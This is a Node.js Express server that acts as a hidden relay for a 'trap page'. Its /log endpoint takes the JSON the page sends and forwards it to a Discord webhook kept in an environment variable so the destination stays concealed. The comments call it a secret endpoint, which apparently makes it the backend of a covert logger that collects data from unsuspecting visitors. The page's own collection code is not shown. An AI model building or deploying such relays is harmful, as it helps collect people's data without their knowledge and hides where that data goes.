const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// This is the secret key. We will get this from Render's environment variables,
// NOT from the code itself. This is the entire point.
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// Use CORS middleware to allow requests from your GitHub Pages domain.
app.use(cors());
// Use Express's JSON parser to handle the incoming data.
app.use(express.json());

// Health check endpoint, just to make sure the server is alive.
app.get('/', (req, res) => {
    res.send('The Ghost is awake.');
});

// This is our secret endpoint. The trap page will send data here.
app.post('/log', async (req, res) => {
    // First, a sanity check. Did we configure the webhook URL on the server?
    if (!DISCORD_WEBHOOK_URL) {
        console.error("FATAL: DISCORD_WEBHOOK_URL is not configured on the server!");
        return res.status(500).json({ error: 'Server configuration error.' });
    }

    // The body of the request from the trap page contains the Discord embed.
    const payload = req.body;

    // Another sanity check. Does the payload look like it has an embed?
    if (!payload || !payload.embeds) {
        console.log("Received an invalid or empty payload.");
        return res.status(400).json({ error: 'Invalid payload.' });
    }

    try {
        // Forward the exact same payload to the REAL Discord webhook.
        await axios.post(DISCORD_WEBHOOK_URL, payload, {
            headers: { 'Content-Type': 'application/json' },
        });
        // If it succeeds, send a "200 OK" back to the trap page.
        res.status(200).json({ success: true });
    } catch (error) {
        // If Discord rejects the webhook (e.g., rate limited), log it on our server.
        console.error("Error forwarding to Discord:", error.message);
        res.status(502).json({ error: 'Failed to forward message.' });
    }
});

app.listen(PORT, () => {
    console.log(`Proxy server listening on port ${PORT}`);
});
